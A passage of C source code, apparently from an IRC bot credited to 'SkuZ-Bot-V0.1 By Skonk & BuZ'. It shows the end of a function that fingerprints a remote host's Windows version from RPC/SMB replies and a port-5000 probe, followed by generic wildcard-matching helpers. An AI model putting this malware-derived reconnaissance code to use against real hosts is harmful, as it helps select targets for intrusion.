							else 
								iRetVal=OS_WIN2K; 
						} else 
							if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
								iRetVal=OS_WINXP;
							else
								iRetVal=OS_UNKNOWN; 
					} else {	
						fclosesocket(sSocket); 
						return iRetVal; 
					} 
				} else {	
					fclosesocket(sSocket); 
					return iRetVal; 
				} 
			} else {	
				fclosesocket(sSocket); 
				return iRetVal; 
			}
			fclosesocket(sSocket); 
			return iRetVal; 
		}
		break;
	case FP_PORT5K:
		if(AdvPortOpen(finet_addr(szHost), 5000, 3)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; 
	}
	return OS_UNKNOWN;
}

#ifndef NO_WILDCARD

int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		case '[':
			wildcard++;
			fit = set (&wildcard, &test);
			break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}

int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}

int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
#endif
/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
/////////////////////////////////////////////////